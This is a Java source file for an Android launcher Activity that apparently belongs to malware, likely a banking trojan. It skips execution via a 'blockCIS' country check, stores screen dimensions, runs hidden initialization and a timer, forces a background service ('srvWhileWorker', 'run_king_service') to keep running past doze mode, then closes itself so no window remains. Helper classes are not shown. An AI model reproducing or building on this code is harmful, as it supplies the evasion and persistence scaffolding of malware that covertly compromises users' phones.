package com.example.mmm;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Point;
import android.os.Bundle;
import com.example.mmm.Services.srvWhileWorker;
import com.example.mmm.Services.Utitlies;
import com.example.mmm.Services.utils;

public class IndexACT extends Activity {

    utils utl = new utils();
    Utitlies idutl = new Utitlies();
    defines consts = new defines();
    private String TAG_LOG  = IndexACT.class.getSimpleName()+ consts.strTAG1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if(utl.blockCIS(this)){
            return;
        }
        Point size = new Point();
        getWindowManager().getDefaultDisplay().getSize(size);
        utl.SettingsWrite(this, consts.display_width, consts.str_null + size.x);
        utl.SettingsWrite(this, consts.display_height,  consts.str_null + size.y);
        try{
            String str = utl.SettingsRead(this, consts.initialization);//Check initialization if error then do it!
            if(str.contains(consts.str_good)) {
                      utl.Log(TAG_LOG, consts.string_137);
                      utl.initialization2(this);
            }
        }catch (Exception ex){
                 utl.Log(TAG_LOG,consts.string_136);
            utl.initialization(this);
        }
        utils.startCustomTimer(this, consts.str_null, 15000);

        try {
            if (!utl.isMyServiceRunning(this, srvWhileWorker.class)) {
                startService(new Intent(this, srvWhileWorker.class));
            }
        }catch (Exception ex) {
            if (!idutl.is_dozemode(this)) {
                utl.start_dozemode("run_king_service", this);
            }
        }
            finish();
    }
}
